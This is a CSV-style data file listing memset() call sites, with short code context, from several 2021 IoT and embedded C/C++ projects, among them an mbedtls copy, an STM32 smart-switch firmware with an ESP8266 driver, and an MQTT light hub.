2021\haas-mini-program\utils\mbedtls\library\x509_crt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\x509_crt.c,"memset( &sig_params1, 0, sizeof( mbedtls_x509_buf ) );",120,1,"    mbedtls_x509_buf sig_params1, sig_params2, sig_oid2;

    memset( &sig_params1, 0, sizeof( mbedtls_x509_buf ) );
    memset( &sig_params2, 0, sizeof( mbedtls_x509_buf ) );
    memset( &sig_oid2, 0, sizeof( mbedtls_x509_buf ) );
"
2021\haas-mini-program\utils\mbedtls\library\x509_crt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\x509_crt.c,"memset( &sig_params2, 0, sizeof( mbedtls_x509_buf ) );",120,1,"
    memset( &sig_params1, 0, sizeof( mbedtls_x509_buf ) );
    memset( &sig_params2, 0, sizeof( mbedtls_x509_buf ) );
    memset( &sig_oid2, 0, sizeof( mbedtls_x509_buf ) );

"
2021\haas-mini-program\utils\mbedtls\library\x509_crt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\x509_crt.c,"memset( &sig_oid2, 0, sizeof( mbedtls_x509_buf ) );",120,1,"    memset( &sig_params1, 0, sizeof( mbedtls_x509_buf ) );
    memset( &sig_params2, 0, sizeof( mbedtls_x509_buf ) );
    memset( &sig_oid2, 0, sizeof( mbedtls_x509_buf ) );

    /*
"
2021\haas-mini-program\utils\mbedtls\library\x509_crt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\x509_crt.c,"memset( szDir, 0, sizeof(szDir) );",120,1,"        return( MBEDTLS_ERR_X509_BAD_INPUT_DATA );

    memset( szDir, 0, sizeof(szDir) );
    memset( filename, 0, MAX_PATH );
    memcpy( filename, path, len );
"
2021\haas-mini-program\utils\mbedtls\library\x509_crt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\x509_crt.c,"memset( filename, 0, MAX_PATH );",120,1,"
    memset( szDir, 0, sizeof(szDir) );
    memset( filename, 0, MAX_PATH );
    memcpy( filename, path, len );
    filename[len++] = '\\';
"
2021\haas-mini-program\utils\mbedtls\library\x509_crt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\x509_crt.c,"memset( p, 0, len );",120,1,"    do
    {
        memset( p, 0, len );

        if( file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )
"
2021\haas-mini-program\utils\mbedtls\library\x509_crt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\x509_crt.c,"memset( crt, 0, sizeof(mbedtls_x509_crt) );",120,1,"void mbedtls_x509_crt_init( mbedtls_x509_crt *crt )
{
    memset( crt, 0, sizeof(mbedtls_x509_crt) );
}

"
2021\HFU-TFunIoT-SoSe21\testing\playground\src\main.cpp,Dataset Download,../../Dataset Download/2021\HFU-TFunIoT-SoSe21\testing\playground\src\main.cpp,"memset(current_db, '\0', sizeof(current_db));",120,1,"    {
        Serial.printf(""Can't open database: %s\n"", sqlite3_errmsg(db1));
        memset(current_db, '\0', sizeof(current_db));
        return rc;
    }
"
2021\intelli-switch\stm32\MDK-ARM\bmp280.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\bmp280.c,"memset(buffer,0,sizeof(buffer));",120,1,"	bmp_280_temperature=(var1+var2)/5120.0;
						//Ó¡Ï¢
	memset(buffer,0,sizeof(buffer));
	sprintf(buffer,""TEMP:%.2f 'C "",bmp_280_temperature);
	if(!AppMode)
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"memset(ESP_RECEIVE_BUFFER,0,sizeof(ESP_RECEIVE_BUFFER));",120,1,"				}
				ESP_REV_CNT=0;
				memset(ESP_RECEIVE_BUFFER,0,sizeof(ESP_RECEIVE_BUFFER));
				return;
			}
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"memset(torevdata,0,sizeof(torevdata));",120,1,"			{
				char torevdata[16];
				memset(torevdata,0,sizeof(torevdata));
				memcpy(torevdata,ESP_RECEIVE_BUFFER+ESP_SERVER_REV_COUNT,ESP_REV_CNT-ESP_SERVER_REV_COUNT+1);
				sscanf(torevdata,""+IPD,%hhu,%hu:"",&ESP_CLIENT_REV_INDEX,&ESP_SERVER_REV_COUNT);
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"memset(AT_CWJAP,0,sizeof(AT_CWJAP));",120,1,"{
	char AT_CWJAP[64];
	memset(AT_CWJAP,0,sizeof(AT_CWJAP));
	sprintf(AT_CWJAP,""AT+CWJAP=\""%s\"",\""%s\"""",SSID,PASSWORD);
	ESP_SendAT(AT_CWJAP);
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"memset(cmd,0,sizeof(0));",120,1,"{
	char cmd[20];uint16_t TIMEOUT_CNT=ESP_SERVER_TRANSMIT_STANDBY_TIMEOUT_MS;
	memset(cmd,0,sizeof(0));
	sprintf(cmd,""AT+CIPSEND=%hhu,%hu"",clientID,len);
	ESP_SERVER_TRANSMIT_AVAILABLE=0;
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"memset(AT_CIPSTART,0,sizeof(AT_CIPSTART));",120,1,"{
	char AT_CIPSTART[80];
	memset(AT_CIPSTART,0,sizeof(AT_CIPSTART));
	sprintf(AT_CIPSTART,""AT+CIPSTART=\""TCP\"",\""%s\"",%s"",ip,port);
	ESP_SendAT(AT_CIPSTART);
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"memset(AT_CIPSERVER,0,sizeof(AT_CIPSERVER));",120,1,"{
	char AT_CIPSERVER[30];
	memset(AT_CIPSERVER,0,sizeof(AT_CIPSERVER));
	sprintf(AT_CIPSERVER,""AT+CIPSERVER=1,%s"",port);
	ESP_SendAT(AT_CIPSERVER);
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"memset(ESP_CLIENTS,0,sizeof(ESP_CLIENTS));",120,1,"void ESP_SERVER_LOOP(void)
{
	memset(ESP_CLIENTS,0,sizeof(ESP_CLIENTS));
	ESP_SERVER_MODE=1;
	ESP_REV_CNT=0;
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"memset(URL,0,sizeof(URL));",120,1,"				{
					char URL[128];
					memset(URL,0,sizeof(URL));
					memcpy(URL,ESP_RECEIVE_BUFFER+url_start,url_end-url_start+1);
					ESP_SERVER_HTTP_HANDLE(i,URL);
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"memset(error,0,sizeof(error));",120,1,"	char content_length[32];
	uint16_t content_len=0;
	memset(error,0,sizeof(error));
	memset(content_length,0,sizeof(content_length));
	sprintf(error,""The URL ('%s') you request for is not found.Please Check the Route Table configured in the Firmware."",URL);
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"memset(content_length,0,sizeof(content_length));",120,1,"	uint16_t content_len=0;
	memset(error,0,sizeof(error));
	memset(content_length,0,sizeof(content_length));
	sprintf(error,""The URL ('%s') you request for is not found.Please Check the Route Table configured in the Firmware."",URL);
	content_len=strlen(ESP_SERVER_HTTP_ERRPAGE_404_1)+strlen(error)+strlen(ESP_SERVER_HTTP_ERRPAGE_404_2);
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"memset(temp,0,sizeof(temp));",120,1,"{
	char temp[80];
	memset(temp,0,sizeof(temp));
	FlashRead();
	if(ESP_SSID[0]>='0'&&ESP_SSID[0]<='z')
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"memset(temp_url,0,sizeof(temp_url));",120,1,"		//sscanf(URL,""/update/%s/%s/%s/%s/"",ESP_SSID,ESP_PASSWD,ESP_TCP_IPADDR,ESP_TCP_PORT);
		char temp_url[128];
		memset(temp_url,0,sizeof(temp_url));
		memcpy(temp_url,URL,url_len);
		char* token;
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"memset(ESP_SSID,0,sizeof(ESP_SSID));",120,1,"			if(splitCNT==0)
			{
				memset(ESP_SSID,0,sizeof(ESP_SSID));
				memcpy(ESP_SSID,token,strlen(token));
			}
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"memset(ESP_PASSWD,0,sizeof(ESP_PASSWD));",120,1,"			else if(splitCNT==1)
			{
				memset(ESP_PASSWD,0,sizeof(ESP_PASSWD));
				memcpy(ESP_PASSWD,token,strlen(token));
			}
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"memset(ESP_TCP_IPADDR,0,sizeof(ESP_TCP_IPADDR));",120,1,"			else if(splitCNT==2)
			{
				memset(ESP_TCP_IPADDR,0,sizeof(ESP_TCP_IPADDR));
				memcpy(ESP_TCP_IPADDR,token,strlen(token));
			}
"
2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\esp8266_Driver.c,"memset(ESP_TCP_PORT,0,sizeof(ESP_TCP_PORT));",120,1,"			else if(splitCNT==3)
			{
				memset(ESP_TCP_PORT,0,sizeof(ESP_TCP_PORT));
				memcpy(ESP_TCP_PORT,token,strlen(token));
			}
"
2021\intelli-switch\stm32\MDK-ARM\GUI.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\GUI.c,"memset(buffer,' ',sizeof(buffer));",120,1,"	if(length<=14)
	{
		memset(buffer,' ',sizeof(buffer));
		for(cnt=0;cnt<length;cnt++)
			buffer[cnt]=dat[cnt];
"
2021\intelli-switch\stm32\MDK-ARM\GUI.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\MDK-ARM\GUI.c,"memset(t_buffer,' ',sizeof(t_buffer));",120,1,"		memcpy(buffer,dat+cnt,length-cnt);
		uint8_t t_buffer[14];
		memset(t_buffer,' ',sizeof(t_buffer));
		for(cnt=0;cnt<length;cnt++)
			t_buffer[cnt]=buffer[cnt];
"
2021\intelli-switch\stm32\Src\main.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\Src\main.c,"memset(databuff,0,sizeof(databuff));",120,1,"void MakeData(void)
{
	memset(databuff,0,sizeof(databuff));
	sprintf((char*)databuff,""$%.2f:%hhu:%.2f:%.1f#"",bmp_280_temperature,DHT11_HUMIDITY,bmp_280_atmospressure,illuminance);
	
"
2021\intelli-switch\stm32\Src\main.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\Src\main.c,"memset(temp_buff,0,sizeof(temp_buff));",120,1,"	uint8_t hour,minute,second;
	uint8_t temp_buff[14];
	memset(temp_buff,0,sizeof(temp_buff));
	memcpy(temp_buff,rev_buff+3,strlen((const char*)rev_buff)-3);
	
"
2021\intelli-switch\stm32\Src\main.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\Src\main.c,"memset(timebuff,0,sizeof(timebuff));",120,1,"	hour=now_Time.Hours;minute=now_Time.Minutes;second=now_Time.Seconds;
	
	memset(timebuff,0,sizeof(timebuff));
	sprintf(timebuff,""%s %02hhu:%02hhu:%02hhu"",week,hour,minute,second);
	l_print(timebuff,1,Middle);
"
2021\intelli-switch\stm32\Src\main.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\Src\main.c,"memset(scrbuffer,0,sizeof(scrbuffer));",120,1,"	char scrbuffer[14];
	
	memset(scrbuffer,0,sizeof(scrbuffer));
	memcpy(scrbuffer,rev_buff+3,14);
	l_print(scrbuffer,0,Left);
"
2021\intelli-switch\stm32\Src\main.c,Dataset Download,../../Dataset Download/2021\intelli-switch\stm32\Src\main.c,"memset(rev_buff,0,sizeof(rev_buff));",120,1,"			display_esp=0;
			rev_cnt=0;
			memset(rev_buff,0,sizeof(rev_buff));
		}
		if(!AppMode)
"
2021\iot-lab\blink_node\node_modules\@serialport\bindings\src\darwin_list.cpp,Dataset Download,../../Dataset Download/2021\iot-lab\blink_node\node_modules\@serialport\bindings\src\darwin_list.cpp,"memset(serialDevice->locationId, 0, sizeof(serialDevice->locationId));",120,1,"        stSerialDevice *serialDevice = &(deviceListItem->value);
        snprintf(serialDevice->port, sizeof(serialDevice->port), ""%s"", bsdPath);
        memset(serialDevice->locationId, 0, sizeof(serialDevice->locationId));
        memset(serialDevice->vendorId, 0, sizeof(serialDevice->vendorId));
        memset(serialDevice->productId, 0, sizeof(serialDevice->productId));
"
2021\iot-lab\blink_node\node_modules\@serialport\bindings\src\darwin_list.cpp,Dataset Download,../../Dataset Download/2021\iot-lab\blink_node\node_modules\@serialport\bindings\src\darwin_list.cpp,"memset(serialDevice->vendorId, 0, sizeof(serialDevice->vendorId));",120,1,"        snprintf(serialDevice->port, sizeof(serialDevice->port), ""%s"", bsdPath);
        memset(serialDevice->locationId, 0, sizeof(serialDevice->locationId));
        memset(serialDevice->vendorId, 0, sizeof(serialDevice->vendorId));
        memset(serialDevice->productId, 0, sizeof(serialDevice->productId));
        serialDevice->manufacturer[0] = '\0';
"
2021\iot-lab\blink_node\node_modules\@serialport\bindings\src\darwin_list.cpp,Dataset Download,../../Dataset Download/2021\iot-lab\blink_node\node_modules\@serialport\bindings\src\darwin_list.cpp,"memset(serialDevice->productId, 0, sizeof(serialDevice->productId));",120,1,"        memset(serialDevice->locationId, 0, sizeof(serialDevice->locationId));
        memset(serialDevice->vendorId, 0, sizeof(serialDevice->vendorId));
        memset(serialDevice->productId, 0, sizeof(serialDevice->productId));
        serialDevice->manufacturer[0] = '\0';
        serialDevice->serialNumber[0] = '\0';
"
2021\iot-lab\blink_node\node_modules\@serialport\bindings\src\poller.cpp,Dataset Download,../../Dataset Download/2021\iot-lab\blink_node\node_modules\@serialport\bindings\src\poller.cpp,"memset(this->poll_handle, 0, sizeof(uv_poll_t));",120,1,"  this->fd = fd;
  this->poll_handle = new uv_poll_t();
  memset(this->poll_handle, 0, sizeof(uv_poll_t));
  poll_handle->data = this;
  int status = uv_poll_init(uv_default_loop(), poll_handle, fd);
"
2021\iot-lab\blink_node\node_modules\@serialport\bindings\src\serialport_win.cpp,Dataset Download,../../Dataset Download/2021\iot-lab\blink_node\node_modules\@serialport\bindings\src\serialport_win.cpp,"memset(ov, 0, sizeof(OVERLAPPED));",120,1,"
  OVERLAPPED* ov = new OVERLAPPED;
  memset(ov, 0, sizeof(OVERLAPPED));
  ov->hEvent = static_cast<void*>(baton);

"
2021\iot2020-2021\sekkyone\main.c,Dataset Download,../../Dataset Download/2021\iot2020-2021\sekkyone\main.c,"memset(subscriptions, 0, (NUMOFSUBS * sizeof(emcute_sub_t)));",120,1,"{
    /* initialize our subscription buffers */
    memset(subscriptions, 0, (NUMOFSUBS * sizeof(emcute_sub_t)));

    /* start the emcute thread */
"
2021\IOTProject\Maintain\doorAccess\cardOpt.c,Dataset Download,../../Dataset Download/2021\IOTProject\Maintain\doorAccess\cardOpt.c,"memset(_pass[i], '\0', strlen(_pass[i]) + 1);",120,1,"        if (strcmp(_pass[i], delID) == 0)
        {
            memset(_pass[i], '\0', strlen(_pass[i]) + 1);
            printf(""åˆªé™¤æˆåŠŸ\n"");
            return;
"
2021\IOTProject\Maintain\doorAccess\doorAccess.c,Dataset Download,../../Dataset Download/2021\IOTProject\Maintain\doorAccess\doorAccess.c,"memset(pass[i], '\0', strlen(pass[i] + 1));",120,1,"                    if (strcmp(pass[i], delID) == 0)
                    {
                      memset(pass[i], '\0', strlen(pass[i] + 1));
                      printf(""Delete successful"");
                      goto SUPER_USER;
"
2021\IOWA_ZephyrOS\iowa_platform.c,Dataset Download,../../Dataset Download/2021\IOWA_ZephyrOS\iowa_platform.c,"memset((char *)&sysAddr, 0, sizeof(sysAddr));",120,1,"    }

    memset((char *)&sysAddr, 0, sizeof(sysAddr));

    sysAddr.sin_family = AF_INET;
"
2021\IOWA_ZephyrOS\main.c,Dataset Download,../../Dataset Download/2021\IOWA_ZephyrOS\main.c,"memset(&devInfo, 0, sizeof(iowa_device_info_t));",120,1,"
    // Configure the LwM2M Client
    memset(&devInfo, 0, sizeof(iowa_device_info_t));
    devInfo.manufacturer = ""IoTerop"";
    result = iowa_client_configure(iowaH, ENDPOINT_NAME, &devInfo, NULL);
"
2021\Kiss-Light_Hub\src\database.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\database.c,"memset( dev_type_str, 0, DEV_TYPE_LEN );",120,1,"{
    /* memset the dev_type_str buffer */
    memset( dev_type_str, 0, DEV_TYPE_LEN );

    switch( in )
"
2021\Kiss-Light_Hub\src\database.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\database.c,"memset( sql_buf, 0, conf->db_buff );",120,1,"
    /* memset the sql buffer */
    memset( sql_buf, 0, conf->db_buff );

    return db_ret;
"
2021\Kiss-Light_Hub\src\database.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\database.c,"memset( memory[i].odev_name, 0, DB_DATA_LEN );",120,1,"
                    /* reset for later use */
                    memset( memory[i].odev_name, 0, DB_DATA_LEN );

                    break;
"
2021\Kiss-Light_Hub\src\database.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\database.c,"memset( memory[i].omqtt_topic, 0, DB_DATA_LEN );",120,1,"                                          memory[i].dev_name );
                    /* reset for later use */
                    memset( memory[i].omqtt_topic, 0, DB_DATA_LEN );

                    break;
"
2021\Kiss-Light_Hub\src\database.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\database.c,"memset( memory[i].dev_state, 0, DV_STATE_LEN );",120,1,"                     */
                    memory[i].dev_type = -1;
                    memset( memory[i].dev_state, 0, DV_STATE_LEN );
                    memset( memory[i].valid_cmnds, 0, DB_CMND_LEN );
                    memset( memory[i].odev_name, 0, DB_DATA_LEN );
"
2021\Kiss-Light_Hub\src\database.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\database.c,"memset( memory[i].valid_cmnds, 0, DB_CMND_LEN );",120,1,"                    memory[i].dev_type = -1;
                    memset( memory[i].dev_state, 0, DV_STATE_LEN );
                    memset( memory[i].valid_cmnds, 0, DB_CMND_LEN );
                    memset( memory[i].odev_name, 0, DB_DATA_LEN );
                    memset( memory[i].omqtt_topic, 0, DB_DATA_LEN );
"
2021\Kiss-Light_Hub\src\main.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\main.c,"memset( bfrs->server_buffer[i], 0, cfg->buffer_size );",120,1,"                cfg->buffer_size * sizeof(char)
            );
            memset( bfrs->server_buffer[i], 0, cfg->buffer_size );
        }

"
2021\Kiss-Light_Hub\src\main.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\main.c,"memset( memory[i].dev_name, 0, DB_DATA_LEN );",120,1,"            bfrs->changes[i] = -1;

            memset( memory[i].dev_name, 0, DB_DATA_LEN );
            memset( memory[i].mqtt_topic, 0, DB_DATA_LEN );
            memory[i].dev_type = -1;
"
2021\Kiss-Light_Hub\src\main.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\main.c,"memset( memory[i].mqtt_topic, 0, DB_DATA_LEN );",120,1,"
            memset( memory[i].dev_name, 0, DB_DATA_LEN );
            memset( memory[i].mqtt_topic, 0, DB_DATA_LEN );
            memory[i].dev_type = -1;
            memset( memory[i].dev_state, 0, DV_STATE_LEN );
"
2021\Kiss-Light_Hub\src\main.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\main.c,"memset( bfrs->sql_buffer, 0, cfg->db_buff );",120,1,"
    bfrs->sql_buffer = (char *)malloc( cfg->db_buff * sizeof(char) );
    memset( bfrs->sql_buffer, 0, cfg->db_buff );
    bfrs->sqlite_buffer = (char *)malloc(
        SQLITE_BUFFER_LEN * sizeof(char)
"
2021\Kiss-Light_Hub\src\main.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\main.c,"memset( bfrs->sqlite_buffer, 0, SQLITE_BUFFER_LEN );",120,1,"        SQLITE_BUFFER_LEN * sizeof(char)
    );
    memset( bfrs->sqlite_buffer, 0, SQLITE_BUFFER_LEN );
    bfrs->dev_type_str = (char *)malloc( DEV_TYPE_LEN * sizeof(char) );
    memset( bfrs->dev_type_str, 0, DEV_TYPE_LEN );
"
2021\Kiss-Light_Hub\src\main.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\main.c,"memset( bfrs->dev_type_str, 0, DEV_TYPE_LEN );",120,1,"    memset( bfrs->sqlite_buffer, 0, SQLITE_BUFFER_LEN );
    bfrs->dev_type_str = (char *)malloc( DEV_TYPE_LEN * sizeof(char) );
    memset( bfrs->dev_type_str, 0, DEV_TYPE_LEN );

#ifdef DEBUG
"
2021\Kiss-Light_Hub\src\main.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\main.c,"memset( bfrs->send_buffer, 0, cfg->snd_buff );",120,1,"
    bfrs->send_buffer = (uint8_t *)malloc( cfg->snd_buff * sizeof(uint8_t) );
    memset( bfrs->send_buffer, 0, cfg->snd_buff );
    bfrs->receive_buffer = (uint8_t *)malloc(
        cfg->recv_buff * sizeof(uint8_t)
"
2021\Kiss-Light_Hub\src\main.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\main.c,"memset( bfrs->receive_buffer, 0, cfg->recv_buff );",120,1,"        cfg->recv_buff * sizeof(uint8_t)
    );
    memset( bfrs->receive_buffer, 0, cfg->recv_buff );
    bfrs->topic = (char *)malloc( cfg->topic_buff * sizeof(char) );
    memset( bfrs->topic, 0, cfg->topic_buff );
"
2021\Kiss-Light_Hub\src\main.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\main.c,"memset( bfrs->topic, 0, cfg->topic_buff );",120,1,"    memset( bfrs->receive_buffer, 0, cfg->recv_buff );
    bfrs->topic = (char *)malloc( cfg->topic_buff * sizeof(char) );
    memset( bfrs->topic, 0, cfg->topic_buff );
    bfrs->application_message = (char *)malloc(
        cfg->app_msg_buff * sizeof(char)
"
2021\Kiss-Light_Hub\src\main.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\main.c,"memset( bfrs->application_message, 0, cfg->app_msg_buff );",120,1,"        cfg->app_msg_buff * sizeof(char)
    );
    memset( bfrs->application_message, 0, cfg->app_msg_buff );

#ifdef DEBUG
"
2021\Kiss-Light_Hub\src\server.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\server.c,"memset( topic, 0, conf->topic_buff );",120,1,"
    /* memset the buffer just in case */
    memset( topic, 0, conf->topic_buff );

    /* create full topic */
"
2021\Kiss-Light_Hub\src\server.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\server.c,"memset( buf, 0, conf->buffer_size );",120,1,"
    /* clean buffer for reuse */
    memset( buf, 0, conf->buffer_size );

    /* ready to analyze request args passed in */
"
2021\Kiss-Light_Hub\src\server.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\server.c,"memset( req_args[i], 0, ARG_BUF_LEN );",120,1,"    for ( int i = 0; i < ARG_LEN; i++ )
    {
        memset( req_args[i], 0, ARG_BUF_LEN );
    }

"
2021\Kiss-Light_Hub\src\server.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\server.c,"memset( memory[loc].dev_name, 0, DB_DATA_LEN );",120,1,"                strncpy( memory[loc].odev_name, dev_name, strlen(dev_name) );
            }
            memset( memory[loc].dev_name, 0, DB_DATA_LEN );
            strncpy( memory[loc].dev_name, arg, strlen(arg) );

"
2021\Kiss-Light_Hub\src\server.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\server.c,"memset( tmp, 0, DB_DATA_LEN );",120,1,"        {
            char tmp[DB_DATA_LEN];
            memset( tmp, 0, DB_DATA_LEN );

            if ( memory[loc].omqtt_topic[0] == '\0' )
"
2021\Kiss-Light_Hub\src\server.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\server.c,"memset( memory[loc].mqtt_topic, 0, DB_DATA_LEN );",120,1,"
            /* memset mqtt_topic and copy new topic over */
            memset( memory[loc].mqtt_topic, 0, DB_DATA_LEN );
            strncpy( memory[loc].mqtt_topic, arg, strlen(arg) );

"
2021\Kiss-Light_Hub\src\server.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\server.c,"memset( cmd, 0, DB_CMND_LEN );",120,1,"    {
        char cmd[DB_CMND_LEN];
        memset( cmd, 0, DB_CMND_LEN );

        /* if a powerstrip set to POWER0 */
"
2021\Kiss-Light_Hub\src\server.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\server.c,"memset( tmp, 0, DB_CMND_LEN );",120,1,"
    /* memset buffers to prevent issues down the road */
    memset( tmp, 0, DB_CMND_LEN );
    memset( tmp_msg, 0, DB_CMND_LEN );

"
2021\Kiss-Light_Hub\src\server.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\server.c,"memset( tmp_msg, 0, DB_CMND_LEN );",120,1,"    /* memset buffers to prevent issues down the road */
    memset( tmp, 0, DB_CMND_LEN );
    memset( tmp_msg, 0, DB_CMND_LEN );

    /* create first part of message */
"
2021\Kiss-Light_Hub\src\server.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\server.c,"memset( tmp, 0, DV_STATE_LEN );",120,1,"
        /* memset these buffers to prevent problems */
        memset( tmp, 0, DV_STATE_LEN );
        memset( tmp_cmnds, 0, DB_CMND_LEN );
        memset( elem, 0, JSON_LEN );
"
2021\Kiss-Light_Hub\src\server.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\server.c,"memset( tmp_cmnds, 0, DB_CMND_LEN );",120,1,"        /* memset these buffers to prevent problems */
        memset( tmp, 0, DV_STATE_LEN );
        memset( tmp_cmnds, 0, DB_CMND_LEN );
        memset( elem, 0, JSON_LEN );

"
2021\Kiss-Light_Hub\src\server.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\server.c,"memset( elem, 0, JSON_LEN );",120,1,"        memset( tmp, 0, DV_STATE_LEN );
        memset( tmp_cmnds, 0, DB_CMND_LEN );
        memset( elem, 0, JSON_LEN );

        /* copy valid commands, ready to go. */
"
2021\Kiss-Light_Hub\src\server.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\server.c,"memset( &serv_addr, 0, sizeof(serv_addr) );",120,1,"
    /* set serv_addr to 0 initially. */
    memset( &serv_addr, 0, sizeof(serv_addr) );

    serv_addr.sin_family = AF_INET;
"
2021\Kiss-Light_Hub\src\server.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\server.c,"memset( server_buffer[count - 1], 0, conf->buffer_size );",120,1,"
            /* Reset respective buffer */
            memset( server_buffer[count - 1], 0, conf->buffer_size );

            /* Handle exit if client wants to exit */
"
2021\Kiss-Light_Hub\src\server.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\server.c,"memset( memory[loc].dev_state, 0, DV_STATE_LEN );",120,1,"        {
            /* memset the dev_state */
            memset( memory[loc].dev_state, 0, DV_STATE_LEN );

            /* copy app_msg as state */
"
2021\Kiss-Light_Hub\src\server.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\server.c,"memset( app_msg, 0, conf->app_msg_buff );",120,1,"    /* memset topic and app message buffers for later use */
    memset( topic, 0, conf->topic_buff );
    memset( app_msg, 0, conf->app_msg_buff );

    /* All done! (for now) */
"
2021\Kiss-Light_Hub\src\statejson.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\statejson.c,"memset( prop, 0, JSON_LEN );",120,1,"    char end[JSON_LEN];

    memset( prop, 0, JSON_LEN );
    memset( elem, 0, JSON_LEN );
    memset( end, 0, JSON_LEN );
"
2021\Kiss-Light_Hub\src\statejson.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\statejson.c,"memset( end, 0, JSON_LEN );",120,1,"    memset( prop, 0, JSON_LEN );
    memset( elem, 0, JSON_LEN );
    memset( end, 0, JSON_LEN );

    jsmn_init( &p );
"
2021\Kiss-Light_Hub\src\statejson.c,Dataset Download,../../Dataset Download/2021\Kiss-Light_Hub\src\statejson.c,"memset( state + t[i + 1].end, 0, strlen(state) - t[i + 1].end );",120,1,"
            memcpy( end, state + t[i + 1].end, strlen(state) - t[i + 1].end );
            memset( state + t[i + 1].end, 0, strlen(state) - t[i + 1].end );
